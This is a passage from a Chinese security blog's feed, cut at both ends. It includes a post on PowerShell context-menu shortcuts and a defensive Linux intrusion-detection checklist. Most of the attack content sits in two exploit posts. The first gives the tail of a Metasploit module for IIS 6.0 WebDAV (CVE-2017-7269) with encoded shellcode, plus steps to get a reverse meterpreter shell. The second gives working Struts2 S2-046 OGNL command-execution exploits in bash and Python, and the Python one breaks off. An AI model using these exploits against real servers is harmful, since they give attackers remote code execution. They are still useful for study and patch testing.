5\xa1\x8a\xe4\x91\x8e\xe7\xa9\x84\xe6\xb0\xb5\xe5\xa9\x96\xe6\x89\x81\xe6\xb9\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5\x90\xb3\xe3\x85\x82\xe5\xa1\xa5\xe5\xa5\x81\xe7\x85\x90\xe3\x80\xb6\xe5\x9d\xb7\xe4\x91\x97\xe5\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83\xe6\xb9\x8f\xe6\xa0\x80\xe6\xb9\x8f\xe6\xa0\x80\xe4\x89\x87\xe7\x99\xaa\xe1\x8f\x80\xe6\xa0\x83\xe4\x89\x97\xe4\xbd\xb4\xe5\xa5\x87\xe5\x88\xb4\xe4\xad\xa6\xe4\xad\x82\xe7\x91\xa4\xe7\xa1\xaf\xe6\x82\x82\xe6\xa0\x81\xe5\x84\xb5\xe7\x89\xba\xe7\x91\xba\xe4\xb5\x87\xe4\x91\x99\xe5\x9d\x97\xeb\x84\x93\xe6\xa0\x80\xe3\x85\xb6\xe6\xb9\xaf\xe2\x93\xa3\xe6\xa0\x81\xe1\x91\xa0\xe6\xa0\x83\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0\x83\xd1\xae\xe6\xa0\x83\xe7\x85\xae\xe7\x91\xb0\xe1\x90\xb4\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81\xe9\x8e\x91\xe6\xa0\x80\xe3\xa4\xb1\xe6\x99\xae\xe4\xa5\x95\xe3\x81\x92\xe5\x91\xab\xe7\x99\xab\xe7\x89\x8a\xe7\xa5\xa1\xe1\x90\x9c\xe6\xa0\x83\xe6\xb8\x85\xe6\xa0\x80\xe7\x9c\xb2\xe7\xa5\xa8\xe4\xb5\xa9\xe3\x99\xac\xe4\x91\xa8\xe4\xb5\xb0\xe8\x89\x86\xe6\xa0\x80\xe4\xa1\xb7\xe3\x89\x93\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd\xaa\xe4\x8c\xb5\xe1\x8f\xb8\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81"</span></div><div class="line"></div><div class="line">    buf1 &lt;&lt; payload.encoded</div><div class="line"></div><div class="line">    sock.put(<span class="string">"PROPFIND / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n#&#123;buf1&#125;&gt;\r\n\r\n"</span>)</div><div class="line"></div><div class="line">    handler</div><div class="line">    disconnect</div><div class="line">  end</div></pre></td></tr></table></figure></p>
<p><em>github地址：<a href="https://github.com/dmchell/metasploit-framework/pull/1/commits/9e8ec532a260b1a3f03abd09efcc44c30e4491c2" target="_blank" rel="external">https://github.com/dmchell/metasploit-framework/pull/1/commits/9e8ec532a260b1a3f03abd09efcc44c30e4491c2</a></em></p>
<h4 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h4><p>　　新建一个文件,如：cve-2017-7269.rb，将以上代码复制进去（或者直接下载该文件）。<br>　　找到metasploit安装目录，将cve-2017-7269.rb文件放到opt/metasploit/apps/pro/msf3/modules/exploit/windows/iis/目录下。（我在mac上试的，目录有所不同，放在这个目录下是为了方便分类管理）。</p>
<p>运行msfconsole并加载cve-2017-7269模块</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt;use exploit/windows/iis/cvce-2017-7269</div><div class="line">&gt;<span class="built_in">set</span> RHOST 192.168.4.244     <span class="comment">#设置目标IP</span></div><div class="line">&gt;exploit</div></pre></td></tr></table></figure>
<p><img src="/upload_image/20170329/1.png" alt=""><br>　　运行exploit，会在本机监听4444端口，存在漏洞的目标服务器会连上本机的4444端口，反弹一个meterpreter。（前提是目标服务器能够ping通本机）<br><img src="/upload_image/20170329/2.png" alt=""><br>通过meterpreter执行shell命令，反弹cmdshell<br><img src="/upload_image/20170329/3.png" alt=""><br>　　此模块默认会加载reverse_tcp payload，用于让目标服务器远程连接本地的某个端口，当然我们也可以改变payload，将其改为bind_tcp，用于让目标服务器监听一个端口，本地主动连接弹出shell。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&gt;<span class="built_in">set</span> PAYLOAD windows/meterpreter/bind_tcp</div></pre></td></tr></table></figure></p>
<p>改完之后，再次测试<br><img src="/upload_image/20170329/4.png" alt=""><br>　　运行exploit，目标服务器监听4444端口，本机会连上目标的4444端口，反弹一个meterpreter。（前提是本机能够ping通目标服务器）</p>
<p>在msf模块中输入set，可查看能够修改的项目，比show options要全一点。<br><img src="/upload_image/20170329/5.png" alt=""></p>
<h3 id="临时解决办法"><a href="#临时解决办法" class="headerlink" title="临时解决办法"></a>临时解决办法</h3><ul>
<li>关闭WebDAV服务</li>
<li>使用相关防护设备</li>
</ul>
<blockquote>
<p>转载请说明出处:<a href="http://thief.one/2017/03/29/IIS6-0远程命令执行漏洞-CVE-2017-7269/">IIS6-0远程命令执行漏洞-CVE-2017-7269 | nMask’Blog</a><br>本文地址：<a href="http://thief.one/2017/03/29/IIS6-0远程命令执行漏洞-CVE-2017-7269/">http://thief.one/2017/03/29/IIS6-0远程命令执行漏洞-CVE-2017-7269/</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> web安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> iis </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Powershell Shortcuts]]></title>
      <url>http://thief.one/2017/03/27/Powershell-Shortcuts/</url>
      <content type="html"><![CDATA[<p><blockquote class="blockquote-center">我们坚持一件事情，并不是因为这样做了会有效果，而是坚信，这样做是对的——哈维尔</blockquote><br>　　Powershell是微软用来取代cmd的解决方案，其功能之强大不言而喻，因此我准备使用powershell来替换cmd。我们知道windows7以后版本，shitf+右键，有一个”在此处打开命令行窗口”的快捷方式，可以在任何目录下打开cmd窗口，比win+R打开再用cd切换目录方便得多。<br><a id="more"></a><br>　　现在既然想用powershell替换cmd，那么这个快捷方式怎么替换呢？直接替换这个快捷方式比较麻烦，我们可以选择新增一个菜单上的快捷方式，这可以通过修改注册表来实现。</p>
<h3 id="文件夹上右键打开Powershell"><a href="#文件夹上右键打开Powershell" class="headerlink" title="文件夹上右键打开Powershell"></a>文件夹上右键打开Powershell</h3><h4 id="打开注册表"><a href="#打开注册表" class="headerlink" title="打开注册表"></a>打开注册表</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">win+R：regedit</div></pre></td></tr></table></figure>
<h4 id="添加项"><a href="#添加项" class="headerlink" title="添加项"></a>添加项</h4><p>进入：HKEY_CLASSES_ROOT\Folder\shell 或者 HKEY_CLASSES_ROOT\Directory\shell目录下。</p>
<ul>
<li>右击新建–项：open_powershell（名称随便取）</li>
<li>再在该项中新建–项：command（名称固定）</li>
<li>双击默认，填写值：C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe</li>
</ul>
<p><em>注意：如果是设置cmd的，可以填写：cmd.exe</em></p>
<h4 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h4><p>选择一个文件夹，右键可以看到open_powershell，选择后便会在此目录下打开一个powershell。</p>
<h3 id="文件上右键打开Powershell"><a href="#文件上右键打开Powershell" class="headerlink" title="文件上右键打开Powershell"></a>文件上右键打开Powershell</h3><p>同样是打开注册表，进入：HKEY_CLASSES_ROOT*\shell目录下。</p>
<ul>
<li>新建–项：open_powershell（随便取）</li>
<li>再在该项中新建–项：command（固定）</li>
<li>双击默认，填写值：C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe</li>
</ul>
<h4 id="最终效果-1"><a href="#最终效果-1" class="headerlink" title="最终效果"></a>最终效果</h4><p>选择一个文件，右键可以看到open_powershell，选择后便会在此目录下打开一个powershell。</p>
<p>转载请说明出处:<br><a href="http://thief.one/2017/03/27/Powershell-Shortcuts/">Powershell Shortcuts | nMask’Blog</a></p>
<p>本文地址：<br><a href="http://thief.one/2017/03/27/Powershell-Shortcuts/">http://thief.one/2017/03/27/Powershell-Shortcuts/</a></p>
]]></content>
      
        <categories>
            
            <category> 系统安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Powershell </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux服务器入侵检测基础]]></title>
      <url>http://thief.one/2017/03/24/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E5%9F%BA%E7%A1%80/</url>
      <content type="html"><![CDATA[<p><blockquote class="blockquote-center">人是生而自由的，但却无往不在枷锁之中，自以为是其他一切主人的人，反而比其他一切更是奴隶</blockquote><br>　　最近遇到了很多服务器被入侵的例子，为了方便日后入侵检测以及排查取证，我查询了一些linux服务器入侵取证的相关资料，并在此总结分享，以便日后查询。<br>　　一般服务器被入侵的迹象，包括但不局限于：由内向外发送大量数据包（DDOS肉鸡）、服务器资源被耗尽（挖矿程序）、不正常的端口连接（反向shell等）、服务器日志被恶意删除等。那么既然是入侵检测，首先要判断的是服务器是否被入侵，必须排除是管理员操作不当导致的问题，因此入侵检测的第一项工作就是询问管理员服务器的异常现象，这对之后入侵类型的判断非常重要。<br><a id="more"></a><br>　　在询问了相关异常信息，排除了管理员操作失误等原因后，那么便可以开始正式的上服务器进行入侵检测以及取证操作了。</p>
<h3 id="审计命令"><a href="#审计命令" class="headerlink" title="审计命令"></a>审计命令</h3><h4 id="last"><a href="#last" class="headerlink" title="last"></a>last</h4><p>　　这个命令可用于查看我们系统的成功登录、关机、重启等情况，本质就是将/var/log/wtmp文件格式化输出，因此如果该文件被删除，则无法输出结果。</p>
<p>相关参数：<br>last -10（-n）   查看最近10条记录<br>last -x reboot   查看重启的记录<br>last -x shutdown 查看关机的记录<br>last -d          查看登陆的记录<br>last –help      命令帮助信息<br>last -f wtmp     用last命令查看wtmp文件（直接打开无法查看）</p>
<h4 id="lastb"><a href="#lastb" class="headerlink" title="lastb"></a>lastb</h4><p>这个命令用于查看登录失败的情况，本质就是将/var/log/btmp文件格式化输出。</p>
<p>相关参数：<br>lastb name（root） 查看root用户登陆失败记录<br>lastb -10（-n）    查看最近10条登陆失败记录<br>lastb –heplp      命令帮助信息</p>
<h4 id="lastlog"><a href="#lastlog" class="headerlink" title="lastlog"></a>lastlog</h4><p>这个命令用于查看用户上一次的登录情况，本质就是将/var/log/lastlog文件格式化输出。</p>
<p>相关参数：<br>lastlog 所有用户上一次登陆记录<br>lastlog -u username（root） root用户上一次登陆记录<br>lastlog –help 命令帮助信息</p>
<h4 id="who"><a href="#who" class="headerlink" title="who"></a>who</h4><p>　　这个命令用户查看当前登录系统的情况，本质就是将/var/log/utmp文件格式化输出。主要用来查看当前用户名称，以及登陆的ip地址信息，w命令与who一样，会更详细一些。</p>
<h4 id="history"><a href="#history" class="headerlink" title="history"></a>history</h4><p>查看历史命令记录，其实就是查看root/.bash_history文件内容，删除这个文件，记录就没了。</p>
<p>相关参数：<br>history 查看所有历史记录<br>history -10 查看最近10条记录<br>history | grep “wget”  查看wget相关信息的记录<br>history –help         命令帮助信息</p>
<p>history显示时间戳：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">export</span> HISTTIMEFORMAT=<span class="string">"%F %T `whoami` "</span></div><div class="line"><span class="built_in">history</span> | more</div></pre></td></tr></table></figure></p>
<h3 id="检查用户"><a href="#检查用户" class="headerlink" title="检查用户"></a>检查用户</h3><p>Linux不同的用户，有不同的操作权限，但是所有用户都会在/etc/passwd、/etc/shadow、/etc/group文件中记录。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">less /etc/passwd　　查看是否有新增用户</div><div class="line">grep :0 /etc/passwd　　查看是否有特权用户（root权限用户）</div><div class="line">ls <span class="_">-l</span> /etc/passwd　　查看passwd最后修改时间</div><div class="line">awk -F: <span class="string">'$3==0 &#123;print $1&#125;'</span> /etc/passwd　　查看是否存在特权用户</div><div class="line">awk -F: <span class="string">'length($2)==0 &#123;print $1&#125;'</span> /etc/shadow　　查看是否存在空口令用户</div></pre></td></tr></table></figure></p>
<p>注：linux设置空口令：passwd -d username</p>
<h3 id="检查进程"><a href="#检查进程" class="headerlink" title="检查进程"></a>检查进程</h3><p>　　一般被入侵的服务器都会运行一些恶意程序，或是挖矿程序，或者DDOS程序等等，如果程序运行着，那么通过查看进程可以发现一些信息。</p>
<h4 id="普通进程"><a href="#普通进程" class="headerlink" title="普通进程"></a>普通进程</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ps -aux　　查看进程</div><div class="line">top        查看进程</div><div class="line">lsof -p pid　　查看进程所打开的端口及文件</div><div class="line">lsof -c 进程名　　查看关联文件</div><div class="line">ps -aux | grep python | cut <span class="_">-d</span> <span class="string">' '</span> <span class="_">-f</span> 2 | xargs <span class="built_in">kill</span>   杀死python相关的进程</div><div class="line">检查/etc/inetd.conf文件，输入：cat /etc/inetd.conf | grep –v <span class="string">"^#"</span>，输出的信息就是你这台机器所开启的远程服务。</div></pre></td></tr></table></figure>
<p>如果进程中没有发现异常，那么可以看看有没有开启某些隐藏进程。</p>
<h4 id="隐藏进程"><a href="#隐藏进程" class="headerlink" title="隐藏进程"></a>隐藏进程</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ps -ef | awk <span class="string">'&#123;print&#125;'</span> | sort -n | uniq &gt;1</div><div class="line">ls /proc | sort -n |uniq &gt;2</div><div class="line">diff 1 2</div></pre></td></tr></table></figure>
<p>注：以上3个步骤为检查隐藏进程。</p>
<h3 id="检查文件"><a href="#检查文件" class="headerlink" title="检查文件"></a>检查文件</h3><p>被入侵的网站，通常肯定有文件被改动，那么可以通过比较文件创建时间、完整性、文件路径等方式查看文件是否被改动。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">find / -uid 0 -print　　查找特权用户文件</div><div class="line">find / -size +10000k -print　　查找大于10000k的文件</div><div class="line">find / -name <span class="string">"…"</span> -prin　　查找用户名为…的文件</div><div class="line">find / -name core -exec ls <span class="_">-l</span> &#123;&#125; \;　　查找core文件，并列出详细信息</div><div class="line">md5sum -b filename　　查看文件的md5值</div><div class="line">rpm -qf /bin/ls　　检查文件的完整性（还有其它/bin目录下的文件）</div><div class="line">whereis 文件名　　查看文件路径</div><div class="line">ls -al 文件名　　查看文件创建时间</div><div class="line">du -sh  文件名   查看文件大小</div></pre></td></tr></table></figure></p>
<h3 id="检查网络"><a href="#检查网络" class="headerlink" title="检查网络"></a>检查网络</h3><p>检查网络的目的，是查看黑客是否通过篡改网卡类型，进行流量嗅探等操作。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">ip link | grep PROMISC　　正常网卡不应该存在promisc，如果存在可能有sniffer</div><div class="line">lsof -i</div><div class="line">netstat -nap　　查看不正常端口</div><div class="line">arp <span class="_">-a</span>　　查看arp记录是否正常</div><div class="line">ifconfig <span class="_">-a</span>　　查看网卡设置</div></pre></td></tr></table></figure></p>
<h3 id="检查计划任务"><a href="#检查计划任务" class="headerlink" title="检查计划任务"></a>检查计划任务</h3><p>当我们尝试kill恶意程序时，往往会遇到被kill程序自动启动的问题，那么就要检查下计划任务(cron)了。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">crontab -u root <span class="_">-l</span>　　查看root用户的计划任务</div><div class="line">cat /etc/crontab</div><div class="line">ls <span class="_">-l</span> /etc/cron.*　　查看cron文件是否变化的详细信息</div><div class="line">ls /var/spool/cron/</div></pre></td></tr></table></figure></p>
<h3 id="检查系统后门"><a href="#检查系统后门" class="headerlink" title="检查系统后门"></a>检查系统后门</h3><p>可以使用工具，如：Conmodo、rkhunter等，当然也可以手工输入命令检查。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">vim <span class="variable">$HOME</span>/.ssh/authorized_keys　　查看ssh永久链接文件</div><div class="line">lsmod　　检查内核模块</div><div class="line">chkconfig –list/systemctl list-units –<span class="built_in">type</span>=service　　检查自启</div></pre></td></tr></table></figure></p>
<p>查看著名的木门后门程序：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ls /etc/rc.d   <span class="comment">#系统开机后，此目录下的文件会被启动</span></div><div class="line">ls /etc/rc3.d  </div><div class="line">find / -name “.rhosts” –<span class="built_in">print</span></div><div class="line">find / -name “.forward” –<span class="built_in">print</span></div></pre></td></tr></table></figure></p>
<h3 id="检查网站后门"><a href="#检查网站后门" class="headerlink" title="检查网站后门"></a>检查网站后门</h3><p>　　如果服务器上运行着web程序，那么需要检查是否通过web漏洞入侵服务器，具体的判断方法可以结合分析中间件日志以及系统日志，但过程需要较长时间。我们也可以通过检查服务器上是否留有入侵者放置的网站后门木马，以此判断黑客是否通过web应用入侵到服务器。</p>
<h4 id="Method-One"><a href="#Method-One" class="headerlink" title="Method One"></a>Method One</h4><ul>
<li>将网站目录下，文件名中含有jsp、php、asp、aspx的文件（注意是含有）都copy出来并压缩。</li>
<li>通过windows下的<a href="http://www.d99net.net/" target="_blank" rel="external">D盾</a>工具扫描打包出来的目录，扫描是否存Webshell（网站后门）</li>
</ul>
<h4 id="Method-Two"><a href="#Method-Two" class="headerlink" title="Method Two"></a>Method Two</h4><p>　　直接使用<a href="https://github.com/tengzhangchao/MaskFindShell" target="_blank" rel="external">MaskFindShell</a>工具，进行webshell扫描（目前只能扫描jsp与php的网站，并且php的误报比较高）<br>关于MaskFindShell详细用法，可以参考：<a href="https://github.com/tengzhangchao/MaskFindShell/blob/master/README.md" target="_blank" rel="external">MaskFindShell-Document</a></p>
<h4 id="寻找服务器物理路径"><a href="#寻找服务器物理路径" class="headerlink" title="寻找服务器物理路径"></a>寻找服务器物理路径</h4><p>无论哪种方法的webshell查找，首先要确定的是web服务器安装的路径，因为webshell都是放在web路径下的。</p>
<ul>
<li>询问管理员、网站开发商</li>
<li><a href="https://github.com/tengzhangchao/SearchWebPath" target="_blank" rel="external">SearchWebPath</a>，具体用法参考：<a href="http://thief.one/2017/03/10/SearchWebPath/">SearchWebPath用法</a></li>
</ul>
<h3 id="打包文件"><a href="#打包文件" class="headerlink" title="打包文件"></a>打包文件</h3><p>　　当我们做好一切入侵检测分析后，我们需要把一些日志文件copy到本地进行更进一步详细的分析时，怎么打包服务器相关信息，并且copy到本地呢？</p>
<h4 id="打包web文件"><a href="#打包web文件" class="headerlink" title="打包web文件"></a>打包web文件</h4><p>打包文件名中包含jsp的文件，打包后的文件为my_txt_files.tar：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tar cvf my_txt_files.tar `find . -type f -name <span class="string">"*.jsp*"</span>`</div></pre></td></tr></table></figure></p>
<h4 id="打包日志文件"><a href="#打包日志文件" class="headerlink" title="打包日志文件"></a>打包日志文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tar -cvf log.tar /var/<span class="built_in">log</span></div></pre></td></tr></table></figure>
<h4 id="打包其他信息"><a href="#打包其他信息" class="headerlink" title="打包其他信息"></a>打包其他信息</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">last &gt; last.log</div><div class="line">netstat -an &gt; netstat.log</div><div class="line">......</div></pre></td></tr></table></figure>
<h3 id="传输文件到本地"><a href="#传输文件到本地" class="headerlink" title="传输文件到本地"></a>传输文件到本地</h3><p>将服务器上的文件传输到本地电脑上的几种方法。</p>
<h4 id="lrzsz"><a href="#lrzsz" class="headerlink" title="lrzsz"></a>lrzsz</h4><p>如果ssh连接的客户端为xshell等，可以安装lrzsz命令（putty无法使用）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install lrzsz</div></pre></td></tr></table></figure></p>
<p>使用：<br>上传文件到linux，rz；下载linux文件，sz 文件名。</p>
<h4 id="开启ftp或者http"><a href="#开启ftp或者http" class="headerlink" title="开启ftp或者http"></a>开启ftp或者http</h4><p>　　开ftp这里我不介绍了，网上很多教程，这里主要说说开启http服务。<br>　　一般linux服务器都默认安装了python，那么可以借助python快速开启一个http服务，详细参考：<a href="http://thief.one/2016/09/14/%E5%9F%BA%E4%BA%8EPython%E7%9A%84WebServer/">基于Python的WebServer</a></p>
<h4 id="U盘挂载"><a href="#U盘挂载" class="headerlink" title="U盘挂载"></a>U盘挂载</h4><p>如果我们不是通过ssh的方式连接，而是直接通过显示器连接上服务器进行操作，那么可以尝试U盘传输。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">fdisk <span class="_">-l</span> 查看U盘路径</div><div class="line">monut /dev/sdb4 /mnt  挂载U盘</div><div class="line"><span class="built_in">cd</span> /mnt 进入U盘</div><div class="line">umount /mnt  退出U盘</div></pre></td></tr></table></figure></p>
<p>本文总结的都是一些Linux入侵检测最基础的命令，至于怎么用好这些命令，需要结合实际情况，主要还是看经验。以上所诉，还只是入侵检测信息收集阶段，至于如何通过现有信息分析出入侵途径，还需要借助其他工具以及知识。</p>
<p>参考链接：<a href="http://www.jb51.net/hack/421908.html" target="_blank" rel="external">http://www.jb51.net/hack/421908.html</a></p>
<p>转载请说明出处:<br><a href="http://thief.one/2017/03/24/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E5%9F%BA%E7%A1%80/">Linux服务器入侵检测基础 | nMask’Blog</a></p>
<p>本文地址：<br><a href="http://thief.one/2017/03/24/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E5%9F%BA%E7%A1%80/">http://thief.one/2017/03/24/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E5%9F%BA%E7%A1%80/</a></p>
]]></content>
      
        <categories>
            
            <category> 系统安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Linux入侵检测 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Struts2-046漏洞]]></title>
      <url>http://thief.one/2017/03/21/Struts2-046%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<p><blockquote class="blockquote-center">屋漏偏逢连夜雨，船迟又遇打头风</blockquote><br>免责申明：<em>文章中的工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负</em><br>　　Apache Struts 2 2.3.32之前的2 2.3.x版本和2.5.10.1之前的2.5.x版本中的Jakarta Multipart解析器存在安全漏洞，该漏洞源于程序没有正确处理文件上传。攻击者可以通过构造HTTP请求头中的Content-Type值可能造成远程任意代码执行，S2-046与S2-045漏洞属于同一类型，不同向量。如果在之前S2-045漏洞曝光后用户已经升级过官方补丁，这次就不受影响。<br><a id="more"></a></p>
<h3 id="触发条件"><a href="#触发条件" class="headerlink" title="触发条件"></a>触发条件</h3><p>1.上传文件的大小（由Content-Length头指定）大于Struts2允许的最大大小（2GB）。<br>2.文件名内容构造恶意的OGNL内容。</p>
<h3 id="S2-046PoC"><a href="#S2-046PoC" class="headerlink" title="S2-046PoC"></a>S2-046PoC</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">POST /<span class="keyword">do</span>Upload.action HTTP/1.1</div><div class="line">Host: localhost:8080</div><div class="line">Content-Length: 10000000</div><div class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAnmUgTEhFhOZpr9z</div><div class="line">Connection: close</div><div class="line"> </div><div class="line">------WebKitFormBoundaryAnmUgTEhFhOZpr9z</div><div class="line">Content-Disposition: form-data; name=<span class="string">"upload"</span>; filename=<span class="string">"%&#123;#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','Kaboom')&#125;"</span></div><div class="line">Content-Type: text/plain</div><div class="line">Kaboom </div><div class="line"> </div><div class="line">------WebKitFormBoundaryAnmUgTEhFhOZpr9z--</div></pre></td></tr></table></figure>
<h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><h4 id="Sh版"><a href="#Sh版" class="headerlink" title="Sh版"></a>Sh版</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"></div><div class="line">url=<span class="variable">$1</span></div><div class="line">cmd=<span class="variable">$2</span></div><div class="line"><span class="built_in">shift</span></div><div class="line"><span class="built_in">shift</span></div><div class="line"></div><div class="line">boundary=<span class="string">"---------------------------735323031399963166993862150"</span></div><div class="line">content_type=<span class="string">"multipart/form-data; boundary=<span class="variable">$boundary</span>"</span></div><div class="line">payload=$(<span class="built_in">echo</span> <span class="string">"%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"</span><span class="variable">$cmd</span><span class="string">"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;"</span>)</div><div class="line"></div><div class="line"><span class="built_in">printf</span> -- <span class="string">"--<span class="variable">$boundary</span>\r\nContent-Disposition: form-data; name=\"foo\"; filename=\"%s\0b\"\r\nContent-Type: text/plain\r\n\r\nx\r\n--<span class="variable">$boundary</span>--\r\n\r\n"</span> <span class="string">"<span class="variable">$payload</span>"</span> | curl <span class="string">"<span class="variable">$url</span>"</span> -H <span class="string">"Content-Type: <span class="variable">$content_type</span>"</span> -H <span class="string">"Expect: "</span> -H <span class="string">"Connection: close"</span> --data-binary @- <span class="variable">$@</span></div></pre></td></tr></table></figure>
<p>sh exploit-cd.sh <a href="http://xxx.com/action" target="_blank" rel="external">http://xxx.com/action</a> “whoami”</p>
<h4 id="Python版"><a href="#Python版" class="headerlink" title="Python版"></a>Python版</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">__author__ = <span class="string">'hackteam.cn'</span></div><div class="line">import pycurl</div><div class="line">import StringIO</div><div class="line">import urllib</div><div class="line">def tt(url,data):</div><div class="line">    sio = StringIO.StringIO()</div><div class="line">    c = pycurl.Curl()</div><div class="line">    c.setopt(pycurl.URL, url)</div><div class="line">    c.setopt(pycurl.REFERER, url)</div><div class="line">    c.setopt(pycurl.HTTPHEADER, [<span class="string">'Connection: close'</span>, <span class="string">'Content-Type: multipart/form-data; boundary=---------------------------735323031399963166993862150'</span>, <span class="string">'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36'</span>])</div><div class="line">    c.setopt(pycurl.HTTP_VERSION, pycurl.CURL_HTTP_VERSION_1_0)</div><div class="line">    c.setopt(pycurl.POST, 1)</div><div class="line">    c.setopt(pycurl.POSTFIELDS, data)</div><div class="line">    